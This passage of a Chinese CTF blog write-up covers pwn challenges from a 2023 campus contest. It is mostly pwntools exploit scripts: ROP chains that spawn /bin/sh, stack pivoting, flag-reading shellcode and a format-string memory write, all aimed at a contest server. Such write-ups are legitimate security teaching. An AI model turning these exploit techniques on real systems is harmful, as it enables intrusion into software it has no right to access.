class=\"string\">&quot;a&quot;</span>*<span class=\"number\">0x68</span> + b<span class=\"string\">&quot;b&quot;</span>*<span class=\"number\">4</span> + p32(pop_eax)+p32(<span class=\"number\">0xb</span>)+p32(pop_ebx)+p32(binsh)+p32(pop_ecx)+p32(<span class=\"number\">0</span>)+p32(pop_edx)+p32(<span class=\"number\">0</span>) + p32(int80)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"泄露栈地址\"><a href=\"#泄露栈地址\" class=\"headerlink\" title=\"泄露栈地址\"></a>泄露栈地址</h3><p>​\t\tputs函数遇到\\n才会停止,所以可以以此来泄露栈上残留的值来泄露地址,其实不一定要泄露这个,哪个都行, <font color=\"red\">不过有一个问题就是,这个值会是固定的嘛… </font></p>\n<p>​\t\t不是固定的….可以换一个泄露,但是如果覆盖了ebp的话,是不是会影响栈桢呢….</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/image-20230605205630458.png\" alt=\"image-20230605205630458\"></p>\n<p>​\t\t溢出长度是不够的,需要栈迁移</p>\n<p>​\t\t当时好像想的是先把&#x2F;bin&#x2F;sh写到一个地方…</p>\n<p>这是做的时候写的exp,是有概率拿到shell的…</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sh = process(&#x27;./pwn1&#x27;)</span></span><br><span class=\"line\">sh = remote(<span class=\"string\">&quot;101.43.247.245&quot;</span>,<span class=\"number\">9201</span>)</span><br><span class=\"line\"><span class=\"comment\">#systemaddr = 0x8048440</span></span><br><span class=\"line\"><span class=\"comment\">#binsh = 0x80486C0</span></span><br><span class=\"line\"><span class=\"comment\">#sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh,&quot;b *0x80488F2&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 泄露栈地址</span></span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">b&quot;say&quot;</span>)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x68</span>)</span><br><span class=\"line\"><span class=\"comment\">#addr = u32(sh.recv(8)[4:8])</span></span><br><span class=\"line\">sh.recv(<span class=\"number\">0x68</span>)</span><br><span class=\"line\">addr = u32(sh.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pop_eax = <span class=\"number\">0x080b8eb6</span></span><br><span class=\"line\">pop_ebx = <span class=\"number\">0x080481c9</span></span><br><span class=\"line\">pop_ecx = <span class=\"number\">0x080df8bd</span></span><br><span class=\"line\">pop_edx = <span class=\"number\">0x0806f83b</span></span><br><span class=\"line\">int80 = <span class=\"number\">0x0806d443</span></span><br><span class=\"line\">leaveret = <span class=\"number\">0x08048798</span></span><br><span class=\"line\">binsh =  addr + <span class=\"number\">0xae</span>-<span class=\"number\">0x78</span>+<span class=\"number\">0x10</span>-<span class=\"number\">4</span> + <span class=\"number\">11</span>*<span class=\"number\">4</span>-<span class=\"number\">4</span></span><br><span class=\"line\">payload= p32(pop_eax)+p32(<span class=\"number\">0xb</span>)+p32(pop_ebx)+p32(binsh)+p32(pop_ecx)+p32(<span class=\"number\">0</span>)+p32(pop_edx)+p32(<span class=\"number\">0</span>) + p32(int80) + <span class=\"string\">b&quot;/bin/sh\\x00&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#payload= b&quot;/bin/sh\\x00&quot;*0x8</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x68</span>,<span class=\"string\">b&quot;a&quot;</span>)+p32(addr+<span class=\"number\">0xae</span>-<span class=\"number\">0x78</span>+<span class=\"number\">0x10</span>-<span class=\"number\">4</span>)+p32(leaveret)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#payload = payload.ljust(0x68,b&quot;a&quot;) +p32(0)+p32(addr+0xbe-0x78+0x10-4)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(addr))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(addr+<span class=\"number\">0xae</span>-<span class=\"number\">0x78</span>+<span class=\"number\">0x10</span>-<span class=\"number\">4</span>))</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t查看符号 readelf objdump?</p>\n<h2 id=\"pwn3\"><a href=\"#pwn3\" class=\"headerlink\" title=\"pwn3\"></a><strong>pwn3</strong></h2><p>恶心的过滤…怎么把过滤应用到这了,</p>\n<p>主要是 一个常用的指令, push xxx, 转成字节码会有\\x68,正好命中了规则,草!</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">##!/usr/bin/env python</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\">#context(os=&#x27;linux&#x27;,arch=&quot;i386&quot;)</span><br><span class=\"line\">#sh = process(&#x27;./pwn3&#x27;)</span><br><span class=\"line\">sh = remote(&quot;101.43.247.245&quot;,9202)</span><br><span class=\"line\">#systemaddr = 0x8048440</span><br><span class=\"line\">#binsh = 0x80486C0</span><br><span class=\"line\">#sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))</span><br><span class=\"line\">context.arch= &#x27;x86&#x27;</span><br><span class=\"line\">context.log_level= &quot;debug&quot;</span><br><span class=\"line\">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class=\"line\">#gdb.attach(sh,&quot;b *0x8048967&quot;)</span><br><span class=\"line\">#gdb.attach(sh)</span><br><span class=\"line\">sh.recvuntil(b&quot;say&quot;)</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">sh.sendline(b&quot;a&quot;*0x60+p32(0)+p32(0x99999)+b&quot;d&quot;*8)</span><br><span class=\"line\">#sh.sendline(b&quot;a&quot;*0x70)</span><br><span class=\"line\">#addr = u32(sh.recv(8)[4:8])</span><br><span class=\"line\">sh.recv(0x70)</span><br><span class=\"line\">addr = u32(sh.recv(4))</span><br><span class=\"line\">print(hex(addr))</span><br><span class=\"line\">print(hex(addr+0xbe-0x90+0x28+4))</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">pop_eax = 0x080b8f16</span><br><span class=\"line\">pop_ebx = 0x080481c9</span><br><span class=\"line\">pop_ecx = 0x080df91d</span><br><span class=\"line\">pop_edx = 0x0806f89b</span><br><span class=\"line\">int80 = 0x0806d4a3</span><br><span class=\"line\">leaveret = 0x08048798</span><br><span class=\"line\">bssaddr = 0x080ECDBB</span><br><span class=\"line\">jmpesp = 0x080dea1f</span><br><span class=\"line\">#binsh =  addr + 0xae-0x78+0x10-4 + 11*4-4</span><br><span class=\"line\">str = &quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#shellcode = asm(&quot;push 0x0;&quot;)</span><br><span class=\"line\">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class=\"line\">        push 0</span><br><span class=\"line\">        mov eax,0x7478742e</span><br><span class=\"line\">        push eax</span><br><span class=\"line\">        mov  eax,0x67616c66</span><br><span class=\"line\">        push eax</span><br><span class=\"line\">        mov ebx,esp</span><br><span class=\"line\">        xor ecx,ecx         #0</span><br><span class=\"line\">        xor edx,edx         #0</span><br><span class=\"line\">        mov eax,0x5         #调用号</span><br><span class=\"line\">        int 0x80</span><br><span class=\"line\">        mov eax,0x3;</span><br><span class=\"line\">        mov ecx,ebx;    # ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”</span><br><span class=\"line\">        mov ebx,0x3;    # 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件</span><br><span class=\"line\">        mov edx,0x120;  #对应字节数</span><br><span class=\"line\">        int 0x80;</span><br><span class=\"line\">        mov eax,0x4;    # eax = sys_write</span><br><span class=\"line\">        mov ebx,0x1;    # ebx = unsigned int fd = 1</span><br><span class=\"line\">        int 0x80;</span><br><span class=\"line\">        &#x27;&#x27;&#x27;)</span><br><span class=\"line\">#shellcode = b&quot;\\x66\\x6c\\x61\\x67&quot; + shellcode</span><br><span class=\"line\">print(shellcode)</span><br><span class=\"line\">#shellcode = asm(&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;)</span><br><span class=\"line\">#shellcode+=asm(&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;)</span><br><span class=\"line\">#shellcode+=asm(&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = p32(pop_eax)+p32(0xb)+p32(pop_ebx)+p32(0)+p32(pop_ecx)+p32(0)+p32(pop_edx)+p32(0) + p32(int80) + b&quot;cat$flag.txt\\x00&quot;</span><br><span class=\"line\">#payload1 = p32(pop_eax)+p32(0x3)+p32(pop_ebx)+p32(0)+p32(pop_ecx)+p32(bssaddr)+p32(pop_edx)+p32(0x20) + p32(int80)</span><br><span class=\"line\">#payload2 = p32(pop_eax)+p32(0x5)+p32(pop_ebx)+p32(bssaddr)+p32(pop_ecx)+p32(0)+p32(pop_edx)+p32(0) + p32(int80)</span><br><span class=\"line\">#payload2 += p32(pop_eax)+p32(0x3)+p32(pop_ebx)+p32(3)+p32(pop_ecx)+p32(bssaddr)+p32(pop_edx)+p32(0x20) + p32(int80)</span><br><span class=\"line\">#payload2 += p32(pop_eax)+p32(0x3)+p32(pop_ebx)+p32(0)+p32(pop_ecx)+p32(bssaddr)+p32(pop_edx)+p32(0x20) + p32(int80)</span><br><span class=\"line\"></span><br><span class=\"line\">#payload = shellcode</span><br><span class=\"line\">#print(payload)</span><br><span class=\"line\">#print(&quot;length&quot;)</span><br><span class=\"line\">#print(len(payload))</span><br><span class=\"line\">#shellcode = b&quot;&quot;</span><br><span class=\"line\">payload = shellcode.ljust(0x60,b&quot;a&quot;) + p32(0)+p32(0xaaaaa) + p64(0) + p32(0xaaa) + p32(jmpesp) + asm(&quot;sub esp,0x78;jmp esp&quot;)</span><br><span class=\"line\">#payload = b&quot;a&quot;*0x60 + p32(0)+p32(0xaaaaa) + p64(0) + p32(0xaaa) + p32(jmpesp) + asm(&quot;sub esp,0x78;jmp esp&quot;)</span><br><span class=\"line\">#payload = b&quot;a&quot;*0x60 + p32(0)+p32(0x9999)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">sh.recv(0x120)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"pwn4\"><a href=\"#pwn4\" class=\"headerlink\" title=\"pwn4\"></a><strong>pwn4</strong></h2><p>​\t\t0x68 ebp ret 的栈空间      输入0x80 24字节溢出, 减去4字节ebp的话,还有20字节</p>\n<p>​\t\t只开了NX,那就还是rop吧,这个有system和&#x2F;bin&#x2F;sh、或者直接后门函数..</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">plt 0x8048440 system</span><br><span class=\"line\">  </span><br><span class=\"line\">0x80486C0 binsh</span><br><span class=\"line\"></span><br><span class=\"line\">.text:080485BD                 public shell</span><br><span class=\"line\">.text:080485BD shell           proc near</span><br><span class=\"line\">.text:080485BD ; __unwind &#123;</span><br><span class=\"line\">.text:080485BD                 push    ebp</span><br><span class=\"line\">.text:080485BE                 mov     ebp, esp</span><br><span class=\"line\">.text:080485C0                 sub     esp, 8</span><br><span class=\"line\">.text:080485C3                 sub     esp, 0Ch</span><br><span class=\"line\">.text:080485C6                 push    offset command  ; &quot;/bin/sh&quot;</span><br><span class=\"line\">.text:080485CB                 call    _system</span><br><span class=\"line\">.text:080485D0                 add     esp, 10h</span><br><span class=\"line\">.text:080485D3                 nop</span><br><span class=\"line\">.text:080485D4                 leave</span><br><span class=\"line\">.text:080485D5                 retn</span><br><span class=\"line\">.text:080485D5 ; &#125; // starts at 80485BD</span><br><span class=\"line\">.text:080485D5 shell           endp</span><br><span class=\"line\">.text:080485D5</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t怎么看system的地址呢?,就是push的值不一样,但怎么确定哪个是system呢? (这个是动态链接了!)</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/image-20230605221857581.png\" alt=\"image-20230605221857581\"></p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sh = process(&#x27;./pwn04&#x27;)</span></span><br><span class=\"line\">sh = remote(<span class=\"string\">&quot;101.43.247.245&quot;</span>,<span class=\"number\">9203</span>)</span><br><span class=\"line\">systemaddr = <span class=\"number\">0x8048440</span></span><br><span class=\"line\">binsh = <span class=\"number\">0x80486C0</span></span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;A&#x27;</span> * (<span class=\"number\">0x68</span>+<span class=\"number\">4</span>) + p32(systemaddr)+p32(<span class=\"number\">0</span>)+p32(binsh))</span><br><span class=\"line\"><span class=\"comment\"># sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(0x80485BD))</span></span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"pwn5\"><a href=\"#pwn5\" class=\"headerlink\" title=\"pwn5\"></a><strong>pwn5</strong></h2><p>主要是要理解清楚逻辑和内存代码布局就可以了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">signed int sub_80488CE()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int v0; // eax</span><br><span class=\"line\">  char v2; // [esp-Ch] [ebp-24h]</span><br><span class=\"line\">  int v3; // [esp+Ch] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  sub_804887C();</span><br><span class=\"line\">  v3 = sub_8059F50(48);</span><br><span class=\"line\">  sub_8048987(v3, 48);</span><br><span class=\"line\">  v0 = sub_804DBD0(v3 + 16) + 5;</span><br><span class=\"line\">  if ( v0 == 8 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    sub_8048987(v3, 48);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else if ( v0 &gt; 8 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    if ( v0 == 10 )</span><br><span class=\"line\">      return 0;</span><br><span class=\"line\">    if ( v0 == 85145 )</span><br><span class=\"line\">      sub_804F700(&quot;/bin/sh&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else if ( v0 == 6 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    sub_804FA00(&quot;where is shell&quot;, v2);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return 1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">#sh = process(&#x27;./pwn5&#x27;)</span><br><span class=\"line\">sh = remote(&quot;101.43.247.245&quot;,9204)</span><br><span class=\"line\">systemaddr = 0x8048440</span><br><span class=\"line\">binsh = 0x80486C0</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= &quot;debug&quot;</span><br><span class=\"line\">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class=\"line\">#gdb.attach(sh,&quot;b *0x008048987&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#payload = p32(0x1234)+p32(0x1234)+ p32(0x1234)+p32(0x1234)+ p32(0x1234)+p32(0x1234)+ p32(0x1234)+p32(0x1234)+p32(0x14c94000)</span><br><span class=\"line\">payload = &quot;1234123412341234&quot; + &quot;85140&quot;</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"pwn6\"><a href=\"#pwn6\" class=\"headerlink\" title=\"pwn6\"></a><strong>pwn6</strong></h2><p>看看又改了啥…</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">signed int sub_80488CE()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int v0; // eax</span><br><span class=\"line\">  char v2; // [esp-Ch] [ebp-24h]</span><br><span class=\"line\">  char *nptr; // [esp+Ch] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  sub_804887C();</span><br><span class=\"line\">  nptr = (char *)sub_8059F40(48);</span><br><span class=\"line\">  sub_8048980(nptr, 48);</span><br><span class=\"line\">  v0 = atoi_0(nptr);</span><br><span class=\"line\">  if ( v0 == 2 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    sub_8048980(nptr, 48);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else if ( v0 &gt; 2 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    if ( v0 == 3 )</span><br><span class=\"line\">      return 0;</span><br><span class=\"line\">    if ( v0 == 12345 )</span><br><span class=\"line\">      sub_804F6F0(&quot;/bin/sh&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else if ( v0 == 1 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    sub_804F9F0(&quot;where is shell&quot;, v2);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return 1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>输入12345即可</p>\n<p>root@hecs-149507:~&#x2F;haida# nc 101.43.247.245 9205</p>\n<p>12345</p>\n<h2 id=\"pwn7\"><a href=\"#pwn7\" class=\"headerlink\" title=\"pwn7\"></a><strong>pwn7</strong></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int sub_89588B7()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char s; // [esp+0h] [ebp-68h]</span><br><span class=\"line\"></span><br><span class=\"line\">  sub_895F980(&quot;please input the way you want go&quot;);</span><br><span class=\"line\">  __libc_read(0, &amp;s, 96);</span><br><span class=\"line\">  _IO_puts(&amp;s);</span><br><span class=\"line\">  return sub_80488E7(&amp;s, 0);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>一个char为什么能占据那么多栈空间???</p>\n<p>应该是有很多路径,可以根据&#x2F;bin&#x2F;sh回溯吧?</p>\n<p>是的…一点点回溯就可以找到</p>\n<p>845542A -&gt; 816c3f7-&gt;8091787-&gt;805ac47 -&gt;804d177-&gt;8049ae7-&gt;8048cd7-&gt;8048977-&gt;80488e7-&gt;main</p>\n<p>p32(87)+p32(83)+p32(68)+p32(87)+p32(65)+p32(65)+p32(87)+p32(68)+p32(87)</p>\n<p>878368876565876887</p>\n<p>WSDWAAWDW(这个就是答案)</p>\n<p>为什么87变成0x38了 56了</p>\n<p>0x80488fd  movzx eax, byte ptr [eax]</p>\n<h2 id=\"pwn8\"><a href=\"#pwn8\" class=\"headerlink\" title=\"pwn8\"></a><strong>pwn8</strong></h2><p>格式化字符串,修改内存值即可</p>\n<p>修改0x80EBF9C处的值为28</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int sub_80488CE()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int result; // eax</span><br><span class=\"line\">  char v1; // [esp+0h] [ebp-68h]</span><br><span class=\"line\"></span><br><span class=\"line\">  sub_804F9B0(&quot;please input what you want say&quot;);</span><br><span class=\"line\">  __libc_read(0, &amp;v1, 96);</span><br><span class=\"line\">  sub_804F9B0(&amp;v1);</span><br><span class=\"line\">  if ( dword_80EBF9C == 28 )</span><br><span class=\"line\">    result = sub_804F6B0(&quot;/bin/sh&quot;);</span><br><span class=\"line\">  else</span><br><span class=\"line\">    result = sub_804F9B0(&quot;the key is %d %d&quot;);</span><br><span class=\"line\">  return result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = b&quot;%28d&quot; + b&quot;A&quot; * (0x90 - len(b&quot;%28d&quot;)) + p32(0x80EBF9C)</span><br><span class=\"line\"></span><br><span class=\"line\">sh = remote(&quot;101.43.247.245&quot;,9207)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= &quot;debug&quot;</span><br><span class=\"line\">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class=\"line\">#gdb.attach(sh,&quot;b *0x008048987&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">#payload = b&quot;%28d&quot; + b&quot;A&quot; * (0x90 - len(b&quot;%28d&quot;)) + p32(0x80EBF9C)</span><br><span class=\"line\">payload = 